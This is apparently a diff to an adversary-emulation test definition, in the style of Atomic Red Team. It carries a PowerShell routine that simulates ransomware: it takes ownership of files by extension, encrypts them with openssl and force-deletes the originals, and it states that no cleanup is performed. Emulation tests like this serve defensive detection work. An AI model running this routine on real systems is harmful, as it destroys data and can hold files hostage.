@@ -72,7 +72,7 @@ atomic_tests:
     dependency_executor_name: powershell
     dependencies:
       - description: |
-          Checks if OpenSSL is installed
+          Checks if openssl is installed
         prereq_command: |
           if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
         get_prereq_command: |
@@ -91,25 +91,19 @@ atomic_tests:
         $password = "#{encryption_password}"
         $targetDir = "#{target_directory}"
         $targetExtensions = "#{target_extensions}".Split(",")
-
         # Convert extensions to a format suitable for PowerShell filtering
         $includeClause = ($targetExtensions | ForEach-Object { "*$_" }) -join ","
-
         # Validate target directory
         if (-Not (Test-Path $targetDir)) {
             Write-Host "❌ The target directory $targetDir does not exist."
             exit 1
         }
-
         Write-Host "✅ Starting encryption process..."
-
         # Encrypt files recursively
         Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
             $file = $_.FullName
-
             # Log the current file being processed
             Write-Host "🔍 Processing file: $file"
-
             # Take ownership and modify permissions
             try {
                 takeown /F $file /A
@@ -119,15 +113,12 @@ atomic_tests:
                 Write-Host "❌ Failed to modify permissions for file: $file"
                 return
             }
-
             # Encrypt the file with OpenSSL
             $encryptedFile = "$file.enc"
             Write-Host "🔒 Encrypting file: $file -> $encryptedFile"
             openssl enc -aes-256-cbc -salt -pbkdf2 -iter 10000 -in $file -out $encryptedFile -pass pass:$password
-            
             if ($LASTEXITCODE -eq 0) {
                 Write-Host "✅ Successfully encrypted: $file -> $encryptedFile"
-                
                 # Delete the original file after successful encryption
                 Remove-Item -Path $file -Recurse -Force
                 Write-Host "🗑️ Deleted original file: $file"
@@ -135,7 +126,6 @@ atomic_tests:
                 Write-Host "❌ Failed to encrypt: $file"
             }
         }
-
         Write-Host "✅ Encryption and deletion process completed!"
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
